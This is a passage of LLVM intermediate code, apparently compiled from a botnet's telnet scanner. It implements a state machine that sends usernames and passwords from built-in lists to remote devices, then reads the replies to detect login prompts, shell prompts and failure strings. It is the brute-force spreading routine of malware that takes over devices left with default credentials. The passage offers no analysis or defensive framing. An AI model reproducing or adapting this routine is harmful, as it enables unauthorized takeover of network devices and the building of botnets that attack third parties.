  %138 = load i32, i32* %137, align 4
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %140, label %143

; <label>:140:                                    ; preds = %136
  %141 = call i64 @time(i64* null) #3
  %142 = trunc i64 %141 to i32
  store i32 %142, i32* %137, align 4
  br label %143

; <label>:143:                                    ; preds = %140, %136
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %145 = load i32, i32* %144, align 16
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %147 = load i8*, i8** %146, align 8
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %149 = load i16, i16* %148, align 16
  %150 = zext i16 %149 to i32
  %151 = call i32 @readUntil(i32 %145, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %147, i32 1024, i32 %150)
  %152 = icmp eq i32 %151, 0
  br i1 %152, label %160, label %153

; <label>:153:                                    ; preds = %143
  store i32 0, i32* %137, align 4
  store i16 0, i16* %148, align 16
  %154 = load i8*, i8** %146, align 8
  %155 = call i8* @strstr(i8* %154, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %156 = icmp eq i8* %155, null
  br i1 %156, label %158, label %157

; <label>:157:                                    ; preds = %153
  store i8 5, i8* %34, align 8
  br label %159

; <label>:158:                                    ; preds = %153
  call void @llvm.memset.p0i8.i64(i8* %154, i8 0, i64 1024, i32 1, i1 false)
  br label %159

; <label>:159:                                    ; preds = %158, %157
  store i8 3, i8* %34, align 8
  br label %711

; <label>:160:                                    ; preds = %143
  %161 = load i32, i32* %144, align 16
  %162 = load i8*, i8** %146, align 8
  %163 = load i16, i16* %148, align 16
  %164 = zext i16 %163 to i32
  %165 = call i32 @readUntil(i32 %161, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %162, i32 1024, i32 %164)
  %166 = icmp eq i32 %165, 0
  br i1 %166, label %174, label %167

; <label>:167:                                    ; preds = %160
  store i32 0, i32* %137, align 4
  store i16 0, i16* %148, align 16
  %168 = load i8*, i8** %146, align 8
  %169 = call i8* @strstr(i8* %168, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %170 = icmp eq i8* %169, null
  br i1 %170, label %172, label %171

; <label>:171:                                    ; preds = %167
  store i8 5, i8* %34, align 8
  br label %173

; <label>:172:                                    ; preds = %167
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 1024, i32 1, i1 false)
  br label %173

; <label>:173:                                    ; preds = %172, %171
  store i8 3, i8* %34, align 8
  br label %711

; <label>:174:                                    ; preds = %160
  %175 = load i32, i32* %144, align 16
  %176 = load i8*, i8** %146, align 8
  %177 = load i16, i16* %148, align 16
  %178 = zext i16 %177 to i32
  %179 = call i32 @readUntil(i32 %175, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %176, i32 1024, i32 %178)
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %188, label %181

; <label>:181:                                    ; preds = %174
  store i32 0, i32* %137, align 4
  store i16 0, i16* %148, align 16
  %182 = load i8*, i8** %146, align 8
  %183 = call i8* @strstr(i8* %182, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %184 = icmp eq i8* %183, null
  br i1 %184, label %186, label %185

; <label>:185:                                    ; preds = %181
  store i8 5, i8* %34, align 8
  br label %187

; <label>:186:                                    ; preds = %181
  call void @llvm.memset.p0i8.i64(i8* %182, i8 0, i64 1024, i32 1, i1 false)
  br label %187

; <label>:187:                                    ; preds = %186, %185
  store i8 3, i8* %34, align 8
  br label %711

; <label>:188:                                    ; preds = %174
  %189 = load i32, i32* %144, align 16
  %190 = load i8*, i8** %146, align 8
  %191 = load i16, i16* %148, align 16
  %192 = zext i16 %191 to i32
  %193 = call i32 @readUntil(i32 %189, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %190, i32 1024, i32 %192)
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %202, label %195

; <label>:195:                                    ; preds = %188
  store i32 0, i32* %137, align 4
  store i16 0, i16* %148, align 16
  %196 = load i8*, i8** %146, align 8
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %198 = icmp eq i8* %197, null
  br i1 %198, label %200, label %199

; <label>:199:                                    ; preds = %195
  store i8 5, i8* %34, align 8
  br label %201

; <label>:200:                                    ; preds = %195
  call void @llvm.memset.p0i8.i64(i8* %196, i8 0, i64 1024, i32 1, i1 false)
  br label %201

; <label>:201:                                    ; preds = %200, %199
  store i8 3, i8* %34, align 8
  br label %711

; <label>:202:                                    ; preds = %188
  %203 = load i32, i32* %144, align 16
  %204 = load i8*, i8** %146, align 8
  %205 = load i16, i16* %148, align 16
  %206 = zext i16 %205 to i32
  %207 = call i32 @readUntil(i32 %203, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %204, i32 1024, i32 %206)
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %216, label %209

; <label>:209:                                    ; preds = %202
  store i32 0, i32* %137, align 4
  store i16 0, i16* %148, align 16
  %210 = load i8*, i8** %146, align 8
  %211 = call i8* @strstr(i8* %210, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %212 = icmp eq i8* %211, null
  br i1 %212, label %214, label %213

; <label>:213:                                    ; preds = %209
  store i8 5, i8* %34, align 8
  br label %215

; <label>:214:                                    ; preds = %209
  call void @llvm.memset.p0i8.i64(i8* %210, i8 0, i64 1024, i32 1, i1 false)
  br label %215

; <label>:215:                                    ; preds = %214, %213
  store i8 3, i8* %34, align 8
  br label %711

; <label>:216:                                    ; preds = %202
  %217 = load i8*, i8** %146, align 8
  %218 = call i64 @strlen(i8* %217) #15
  %219 = trunc i64 %218 to i16
  store i16 %219, i16* %148, align 16
  %220 = load i32, i32* %137, align 4
  %221 = add i32 %220, 10
  %222 = zext i32 %221 to i64
  %223 = call i64 @time(i64* null) #3
  %224 = icmp slt i64 %222, %223
  br i1 %224, label %225, label %711

; <label>:225:                                    ; preds = %216
  %226 = load i32, i32* %144, align 16
  %227 = call i32 @sclose(i32 %226)
  store i8 0, i8* %34, align 8
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %228, align 1
  br label %711

; <label>:229:                                    ; preds = %.lr.ph
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %231 = load i32, i32* %230, align 16
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %233 = load i8, i8* %232, align 2
  %234 = zext i8 %233 to i64
  %235 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %234
  %236 = load i8*, i8** %235, align 8
  %237 = call i64 @strlen(i8* %236) #15
  %238 = call i64 @send(i32 %231, i8* %236, i64 %237, i32 16384) #3
  %239 = icmp slt i64 %238, 0
  %240 = load i32, i32* %230, align 16
  br i1 %239, label %241, label %244

; <label>:241:                                    ; preds = %229
  %242 = call i32 @sclose(i32 %240)
  store i8 0, i8* %34, align 8
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %243, align 1
  br label %711

; <label>:244:                                    ; preds = %229
  %245 = call i64 @send(i32 %240, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %246 = icmp slt i64 %245, 0
  br i1 %246, label %247, label %251

; <label>:247:                                    ; preds = %244
  %248 = load i32, i32* %230, align 16
  %249 = call i32 @sclose(i32 %248)
  store i8 0, i8* %34, align 8
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %250, align 1
  br label %711

; <label>:251:                                    ; preds = %244
  store i8 4, i8* %34, align 8
  br label %711

; <label>:252:                                    ; preds = %.lr.ph
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %254 = load i32, i32* %253, align 4
  %255 = icmp eq i32 %254, 0
  br i1 %255, label %256, label %259

; <label>:256:                                    ; preds = %252
  %257 = call i64 @time(i64* null) #3
  %258 = trunc i64 %257 to i32
  store i32 %258, i32* %253, align 4
  br label %259

; <label>:259:                                    ; preds = %256, %252
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %261 = load i32, i32* %260, align 16
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %263 = load i8*, i8** %262, align 8
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %265 = load i16, i16* %264, align 16
  %266 = zext i16 %265 to i32
  %267 = call i32 @readUntil(i32 %261, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %263, i32 1024, i32 %266)
  %268 = icmp eq i32 %267, 0
  br i1 %268, label %273, label %269

; <label>:269:                                    ; preds = %259
  store i32 0, i32* %253, align 4
  store i16 0, i16* %264, align 16
  %270 = load i8*, i8** %262, align 8
  %271 = call i8* @strstr(i8* %270, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #15
  %272 = icmp ne i8* %271, null
  %.sink = select i1 %272, i8 5, i8 7
  store i8 %.sink, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %270, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:273:                                    ; preds = %259
  %274 = load i32, i32* %260, align 16
  %275 = load i8*, i8** %262, align 8
  %276 = load i16, i16* %264, align 16
  %277 = zext i16 %276 to i32
  %278 = call i32 @readUntil(i32 %274, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %275, i32 1024, i32 %277)
  %279 = icmp eq i32 %278, 0
  br i1 %279, label %284, label %280

; <label>:280:                                    ; preds = %273
  store i32 0, i32* %253, align 4
  store i16 0, i16* %264, align 16
  %281 = load i8*, i8** %262, align 8
  %282 = call i8* @strstr(i8* %281, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #15
  %283 = icmp ne i8* %282, null
  %.sink1 = select i1 %283, i8 5, i8 7
  store i8 %.sink1, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %281, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:284:                                    ; preds = %273
  %285 = load i8*, i8** %262, align 8
  %286 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %287 = icmp eq i8* %286, null
  br i1 %287, label %292, label %288

; <label>:288:                                    ; preds = %284
  %289 = load i32, i32* %260, align 16
  %290 = call i32 @sclose(i32 %289)
  store i8 0, i8* %34, align 8
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %291, align 1
  br label %711

; <label>:292:                                    ; preds = %284
  %293 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %294 = icmp eq i8* %293, null
  br i1 %294, label %299, label %295

; <label>:295:                                    ; preds = %292
  %296 = load i32, i32* %260, align 16
  %297 = call i32 @sclose(i32 %296)
  store i8 0, i8* %34, align 8
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %298, align 1
  br label %711

; <label>:299:                                    ; preds = %292
  %300 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %301 = icmp eq i8* %300, null
  br i1 %301, label %306, label %302

; <label>:302:                                    ; preds = %299
  %303 = load i32, i32* %260, align 16
  %304 = call i32 @sclose(i32 %303)
  store i8 0, i8* %34, align 8
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %305, align 1
  br label %711

; <label>:306:                                    ; preds = %299
  %307 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %308 = icmp eq i8* %307, null
  br i1 %308, label %313, label %309

; <label>:309:                                    ; preds = %306
  %310 = load i32, i32* %260, align 16
  %311 = call i32 @sclose(i32 %310)
  store i8 0, i8* %34, align 8
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %312, align 1
  br label %711

; <label>:313:                                    ; preds = %306
  %314 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %315 = icmp eq i8* %314, null
  br i1 %315, label %320, label %316

; <label>:316:                                    ; preds = %313
  %317 = load i32, i32* %260, align 16
  %318 = call i32 @sclose(i32 %317)
  store i8 0, i8* %34, align 8
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %319, align 1
  br label %711

; <label>:320:                                    ; preds = %313
  %321 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %322 = icmp eq i8* %321, null
  br i1 %322, label %327, label %323

; <label>:323:                                    ; preds = %320
  %324 = load i32, i32* %260, align 16
  %325 = call i32 @sclose(i32 %324)
  store i8 0, i8* %34, align 8
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %326, align 1
  br label %711

; <label>:327:                                    ; preds = %320
  %328 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %329 = icmp eq i8* %328, null
  br i1 %329, label %334, label %330

; <label>:330:                                    ; preds = %327
  %331 = load i32, i32* %260, align 16
  %332 = call i32 @sclose(i32 %331)
  store i8 0, i8* %34, align 8
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %333, align 1
  br label %711

; <label>:334:                                    ; preds = %327
  %335 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %336 = icmp eq i8* %335, null
  br i1 %336, label %341, label %337

; <label>:337:                                    ; preds = %334
  %338 = load i32, i32* %260, align 16
  %339 = call i32 @sclose(i32 %338)
  store i8 0, i8* %34, align 8
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %340, align 1
  br label %711

; <label>:341:                                    ; preds = %334
  %342 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %343 = icmp eq i8* %342, null
  br i1 %343, label %348, label %344

; <label>:344:                                    ; preds = %341
  %345 = load i32, i32* %260, align 16
  %346 = call i32 @sclose(i32 %345)
  store i8 0, i8* %34, align 8
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %347, align 1
  br label %711

; <label>:348:                                    ; preds = %341
  %349 = call i64 @strlen(i8* %285) #15
  %350 = trunc i64 %349 to i16
  store i16 %350, i16* %264, align 16
  %351 = load i32, i32* %253, align 4
  %352 = add i32 %351, 10
  %353 = zext i32 %352 to i64
  %354 = call i64 @time(i64* null) #3
  %355 = icmp slt i64 %353, %354
  br i1 %355, label %356, label %711

; <label>:356:                                    ; preds = %348
  %357 = load i32, i32* %260, align 16
  %358 = call i32 @sclose(i32 %357)
  store i8 0, i8* %34, align 8
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %359, align 1
  br label %711

; <label>:360:                                    ; preds = %.lr.ph
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %362 = load i32, i32* %361, align 16
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %364 = load i8, i8* %363, align 1
  %365 = zext i8 %364 to i64
  %366 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %365
  %367 = load i8*, i8** %366, align 8
  %368 = call i64 @strlen(i8* %367) #15
  %369 = call i64 @send(i32 %362, i8* %367, i64 %368, i32 16384) #3
  %370 = icmp slt i64 %369, 0
  %371 = load i32, i32* %361, align 16
  br i1 %370, label %372, label %375

; <label>:372:                                    ; preds = %360
  %373 = call i32 @sclose(i32 %371)
  store i8 0, i8* %34, align 8
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %374, align 1
  br label %711

; <label>:375:                                    ; preds = %360
  %376 = call i64 @send(i32 %371, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %377 = icmp slt i64 %376, 0
  br i1 %377, label %378, label %382

; <label>:378:                                    ; preds = %375
  %379 = load i32, i32* %361, align 16
  %380 = call i32 @sclose(i32 %379)
  store i8 0, i8* %34, align 8
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %381, align 1
  br label %711

; <label>:382:                                    ; preds = %375
  store i8 6, i8* %34, align 8
  br label %711

; <label>:383:                                    ; preds = %.lr.ph
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %385 = load i32, i32* %384, align 4
  %386 = icmp eq i32 %385, 0
  br i1 %386, label %387, label %390

; <label>:387:                                    ; preds = %383
  %388 = call i64 @time(i64* null) #3
  %389 = trunc i64 %388 to i32
  store i32 %389, i32* %384, align 4
  br label %390

; <label>:390:                                    ; preds = %387, %383
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %392 = load i32, i32* %391, align 16
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %394 = load i8*, i8** %393, align 8
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %396 = load i16, i16* %395, align 16
  %397 = zext i16 %396 to i32
  %398 = call i32 @readUntil(i32 %392, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %394, i32 1024, i32 %397)
  %399 = icmp eq i32 %398, 0
  br i1 %399, label %416, label %400

; <label>:400:                                    ; preds = %390
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %401 = load i8*, i8** %393, align 8
  %402 = call i8* @strstr(i8* %401, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #15
  %403 = icmp eq i8* %402, null
  br i1 %403, label %408, label %404

; <label>:404:                                    ; preds = %400
  call void @llvm.memset.p0i8.i64(i8* %401, i8 0, i64 1024, i32 1, i1 false)
  %405 = load i32, i32* %391, align 16
  %406 = call i32 @sclose(i32 %405)
  store i8 0, i8* %34, align 8
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %407, align 1
  br label %711

; <label>:408:                                    ; preds = %400
  %409 = call i32 @matchPrompt(i8* %401)
  %410 = icmp eq i32 %409, 0
  br i1 %410, label %411, label %415

; <label>:411:                                    ; preds = %408
  call void @llvm.memset.p0i8.i64(i8* %401, i8 0, i64 1024, i32 1, i1 false)
  %412 = load i32, i32* %391, align 16
  %413 = call i32 @sclose(i32 %412)
  store i8 0, i8* %34, align 8
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %414, align 1
  br label %711

; <label>:415:                                    ; preds = %408
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %401, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:416:                                    ; preds = %390
  %417 = load i32, i32* %391, align 16
  %418 = load i8*, i8** %393, align 8
  %419 = load i16, i16* %395, align 16
  %420 = zext i16 %419 to i32
  %421 = call i32 @readUntil(i32 %417, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %418, i32 1024, i32 %420)
  %422 = icmp eq i32 %421, 0
  br i1 %422, label %439, label %423

; <label>:423:                                    ; preds = %416
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %424 = load i8*, i8** %393, align 8
  %425 = call i8* @strstr(i8* %424, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #15
  %426 = icmp eq i8* %425, null
  br i1 %426, label %431, label %427

; <label>:427:                                    ; preds = %423
  call void @llvm.memset.p0i8.i64(i8* %424, i8 0, i64 1024, i32 1, i1 false)
  %428 = load i32, i32* %391, align 16
  %429 = call i32 @sclose(i32 %428)
  store i8 0, i8* %34, align 8
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %430, align 1
  br label %711

; <label>:431:                                    ; preds = %423
  %432 = call i32 @matchPrompt(i8* %424)
  %433 = icmp eq i32 %432, 0
  br i1 %433, label %434, label %438

; <label>:434:                                    ; preds = %431
  call void @llvm.memset.p0i8.i64(i8* %424, i8 0, i64 1024, i32 1, i1 false)
  %435 = load i32, i32* %391, align 16
  %436 = call i32 @sclose(i32 %435)
  store i8 0, i8* %34, align 8
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %437, align 1
  br label %711

; <label>:438:                                    ; preds = %431
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %424, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:439:                                    ; preds = %416
  %440 = load i32, i32* %391, align 16
  %441 = load i8*, i8** %393, align 8
  %442 = load i16, i16* %395, align 16
  %443 = zext i16 %442 to i32
  %444 = call i32 @readUntil(i32 %440, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %441, i32 1024, i32 %443)
  %445 = icmp eq i32 %444, 0
  br i1 %445, label %455, label %446

; <label>:446:                                    ; preds = %439
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %447 = load i8*, i8** %393, align 8
  %448 = call i8* @strstr(i8* %447, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #15
  %449 = icmp eq i8* %448, null
  br i1 %449, label %454, label %450

; <label>:450:                                    ; preds = %446
  call void @llvm.memset.p0i8.i64(i8* %447, i8 0, i64 1024, i32 1, i1 false)
  %451 = load i32, i32* %391, align 16
  %452 = call i32 @sclose(i32 %451)
  store i8 0, i8* %34, align 8
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %453, align 1
  br label %711

; <label>:454:                                    ; preds = %446
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %447, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:455:                                    ; preds = %439
  %456 = load i32, i32* %391, align 16
  %457 = load i8*, i8** %393, align 8
  %458 = load i16, i16* %395, align 16
  %459 = zext i16 %458 to i32
  %460 = call i32 @readUntil(i32 %456, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %457, i32 1024, i32 %459)
  %461 = icmp eq i32 %460, 0
  br i1 %461, label %471, label %462

; <label>:462:                                    ; preds = %455
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %463 = load i8*, i8** %393, align 8
  %464 = call i8* @strstr(i8* %463, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #15
  %465 = icmp eq i8* %464, null
  br i1 %465, label %470, label %466

; <label>:466:                                    ; preds = %462
  call void @llvm.memset.p0i8.i64(i8* %463, i8 0, i64 1024, i32 1, i1 false)
  %467 = load i32, i32* %391, align 16
  %468 = call i32 @sclose(i32 %467)
  store i8 0, i8* %34, align 8
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %469, align 1
  br label %711

; <label>:470:                                    ; preds = %462
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %463, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:471:                                    ; preds = %455
  %472 = load i32, i32* %391, align 16
  %473 = load i8*, i8** %393, align 8
  %474 = load i16, i16* %395, align 16
  %475 = zext i16 %474 to i32
  %476 = call i32 @readUntil(i32 %472, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %473, i32 1024, i32 %475)
  %477 = icmp eq i32 %476, 0
  br i1 %477, label %487, label %478

; <label>:478:                                    ; preds = %471
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %479 = load i8*, i8** %393, align 8
  %480 = call i8* @strstr(i8* %479, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #15
  %481 = icmp eq i8* %480, null
  br i1 %481, label %486, label %482

; <label>:482:                                    ; preds = %478
  call void @llvm.memset.p0i8.i64(i8* %479, i8 0, i64 1024, i32 1, i1 false)
  %483 = load i32, i32* %391, align 16
  %484 = call i32 @sclose(i32 %483)
  store i8 0, i8* %34, align 8
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %485, align 1
  br label %711

; <label>:486:                                    ; preds = %478
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %479, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:487:                                    ; preds = %471
  %488 = load i32, i32* %391, align 16
  %489 = load i8*, i8** %393, align 8
  %490 = load i16, i16* %395, align 16
  %491 = zext i16 %490 to i32
  %492 = call i32 @readUntil(i32 %488, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %489, i32 1024, i32 %491)
  %493 = icmp eq i32 %492, 0
  br i1 %493, label %503, label %494

; <label>:494:                                    ; preds = %487
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %495 = load i8*, i8** %393, align 8
  %496 = call i8* @strstr(i8* %495, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %497 = icmp eq i8* %496, null
  br i1 %497, label %502, label %498

; <label>:498:                                    ; preds = %494
  call void @llvm.memset.p0i8.i64(i8* %495, i8 0, i64 1024, i32 1, i1 false)
  %499 = load i32, i32* %391, align 16
  %500 = call i32 @sclose(i32 %499)
  store i8 0, i8* %34, align 8
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %501, align 1
  br label %711

; <label>:502:                                    ; preds = %494
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %495, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:503:                                    ; preds = %487
  %504 = load i32, i32* %391, align 16
  %505 = load i8*, i8** %393, align 8
  %506 = load i16, i16* %395, align 16
  %507 = zext i16 %506 to i32
  %508 = call i32 @readUntil(i32 %504, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %505, i32 1024, i32 %507)
  %509 = icmp eq i32 %508, 0
  br i1 %509, label %519, label %510

; <label>:510:                                    ; preds = %503
  store i32 0, i32* %384, align 4
  store i16 0, i16* %395, align 16
  %511 = load i8*, i8** %393, align 8
  %512 = call i8* @strstr(i8* %511, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %513 = icmp eq i8* %512, null
  br i1 %513, label %518, label %514

; <label>:514:                                    ; preds = %510
  call void @llvm.memset.p0i8.i64(i8* %511, i8 0, i64 1024, i32 1, i1 false)
  %515 = load i32, i32* %391, align 16
  %516 = call i32 @sclose(i32 %515)
  store i8 0, i8* %34, align 8
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %517, align 1
  br label %711

; <label>:518:                                    ; preds = %510
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %511, i8 0, i64 1024, i32 1, i1 false)
  br label %711

; <label>:519:                                    ; preds = %503
  %520 = load i32, i32* %391, align 16
  %521 = load i8*, i8** %393, align 8
  %522 = load i16, i16* %395, align 16
  %523 = zext i16 %522 to i32
  %524 = call i32 @readUntil(i32 %520, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %521, i32 1024, i32 %523)
  %525 = icmp eq i32 %524, 0
  br i1 %525, label %535, label %526

; <label>:526:                                    ; preds = %519
